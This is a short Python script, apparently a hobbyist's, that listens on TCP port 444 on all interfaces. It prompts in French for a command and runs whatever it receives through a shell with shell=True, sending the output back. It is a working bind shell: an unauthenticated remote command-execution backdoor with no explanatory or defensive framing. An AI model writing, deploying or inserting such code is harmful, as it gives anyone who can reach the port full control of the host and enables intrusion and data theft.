import socket
import subprocess

s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0",444))
s.listen(1)

while True:
    connexion, client_address = s.accept()
    print ("connexion from :" +str(client_address))
    while True:
        connexion.send(bytes("Entrer cmd : ", "utf-8"))
        cmd = connexion.recv(1024).decode()
       # p = subprocess.Popen(cmd.split(" "),shell=True
        p = subprocess.Popen(cmd,shell=True
            ,stdout=subprocess.PIPE,stderr = subprocess.PIPE)
        out , err = p.communicate()
        connexion.send(out)